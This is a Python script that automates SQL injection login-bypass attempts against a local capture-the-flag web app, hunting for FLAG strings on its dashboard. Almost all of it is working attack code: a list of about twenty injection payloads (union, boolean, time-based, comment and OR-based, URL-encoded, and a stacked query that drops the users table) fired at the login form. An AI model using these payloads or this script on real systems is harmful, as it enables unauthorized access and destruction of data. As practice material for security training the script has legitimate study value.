import requests
import re
import time

url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}

cookies = {
    "PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"
}

print("[*] Attempting authentication bypass via SQL injection")
print("[*] Target: http://127.0.0.1:32892/index.php\n")

# Advanced SQL injection payloads
sqli_payloads = [
    # Union-based
    ("admin' UNION SELECT 'admin', 'password'--", "anything"),
    ("admin' UNION SELECT 'admin', '7d39307ae824e70052c0aa16816a9b16'--", "anything"),
    
    # Boolean-based
    ("admin' AND '1'='1", "anything"),
    ("admin' AND 1=1#", "anything"),
    
    # Time-based (careful with these)
    ("admin' AND IF(1=1, SLEEP(0), 0)--", "anything"),
    
    # Comment-based
    ("admin'--", ""),
    ("admin' --", ""),
    ("admin'#", ""),
    ("admin';--", ""),
    
    # Or-based
    ("' OR 1=1--", "' OR 1=1--"),
    ("' OR 'a'='a", "' OR 'a'='a"),
    ("admin' OR '1'='1'#", ""),
    
    # Password field injection
    ("admin", "' OR '1'='1"),
    ("admin", "' OR 1=1--"),
    ("admin", "' OR '1'='1'--"),
    ("admin", "' OR 'x'='x"),
    
    # Stacked queries
    ("admin'; DROP TABLE users--", "anything"),
    ("admin'; SELECT * FROM users--", "anything"),
    
    # Encoded
    ("admin%27--", "anything"),
    ("admin%27%20OR%20%271%27=%271", "anything"),
]

print(f"[*] Testing {len(sqli_payloads)} SQL injection payloads...\n")

for idx, (username, password) in enumerate(sqli_payloads, 1):
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, cookies=cookies, 
                                allow_redirects=False, timeout=5)
        
        print(f"[{idx}] Username: {username[:50]}")
        print(f"    Password: {password[:50]}")
        print(f"    Response: {response.text}")
        
        # Check for success indicators
        if ("success" in response.text.lower() and "password" not in response.text and "username" not in response.text):
            print(f"    [!] POSSIBLE BYPASS!")
            
            # Try to access dashboard
            session = requests.Session()
            session.cookies.update(cookies)
            session.cookies.update(response.cookies)
            
            dashboard = session.get("http://127.0.0.1:32892/dashboard.php")
            print(f"    [*] Dashboard access: {dashboard.status_code}")
            print(f"    [*] Dashboard response:\n{dashboard.text}")
            
            flags = re.findall(r'FLAG\{[^}]+\}', dashboard.text)
            if flags:
                print(f"    [!] FLAGS FOUND: {flags}")
        
        # Check for flags in login response
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"    [!] FLAGS IN LOGIN RESPONSE: {flags}")
        
        # Check for error messages that might leak info
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"    [*] Possible SQL error: {response.text}")
        
        print()
        
        # Small delay to avoid overwhelming the server
        time.sleep(0.1)
        
    except requests.exceptions.Timeout:
        print(f"    [*] TIMEOUT - possible time-based blind SQLi indicator")
        print()
    except Exception as e:
        print(f"    [!] Error: {str(e)}")
        print()

print("\n[*] SQL injection bypass attempts completed")

